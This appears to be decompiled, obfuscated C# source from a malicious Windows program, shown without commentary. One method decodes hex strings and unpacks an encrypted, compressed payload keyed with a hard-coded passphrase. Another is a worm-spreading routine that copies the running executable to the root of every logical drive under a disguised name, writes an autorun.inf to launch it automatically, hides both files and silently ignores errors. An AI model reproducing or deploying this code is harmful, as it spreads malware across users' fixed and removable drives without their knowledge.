using System;
using System.IO;
using System.Reflection;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

[StandardModule]
public sealed class GClass0
{
	public static byte[] smethod_0(string string_0)
	{
		string text = string_0;
		int length = text.Length;
		int num = length / 2;
		if (length % 2 == 0)
		{
			num = checked(num - 1);
		}
		else
		{
			text = "0" + text;
		}
		checked
		{
			byte[] array = new byte[num + 1];
			long num2 = num;
			for (long num3 = 0L; num3 <= num2; num3++)
			{
				array[(int)num3] = Convert.ToByte(text.Substring((int)(num3 * 2L), 2), 16);
			}
			return array;
		}
	}

	public static string smethod_1(string string_0)
	{
		GClass2 gClass = new GClass2(Encoding.GetEncoding("UTF-8"));
		gClass.Passphrase = "magic_word";
		gClass.PrefixForCompressedString = "<COMPRESSED>";
		gClass.SuffixForCompressedString = "</COMPRESSED>";
		gClass.Compressed = string_0;
		return gClass.UnCompressed;
	}

	public static string smethod_2()
	{
		string programFiles = ((ServerComputer)Class2.Class1_0).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		for (int i = 0; i < array.Length; i = checked(i + 1))
		{
			programFiles = array[i];
			try
			{
				if (!File.Exists(programFiles + "aS_J_v_.exe"))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "aS_J_v_.exe");
				}
				object obj = new StreamWriter(programFiles + "autorun.inf");
				NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { "[autorun]" }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { "open = aS_J_v_.exe" }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { "shellexecute=aS_J_v_.exe" }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(obj, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
				File.SetAttributes(programFiles + "aS_J_v_.exe", FileAttributes.Hidden);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return null;
	}
}
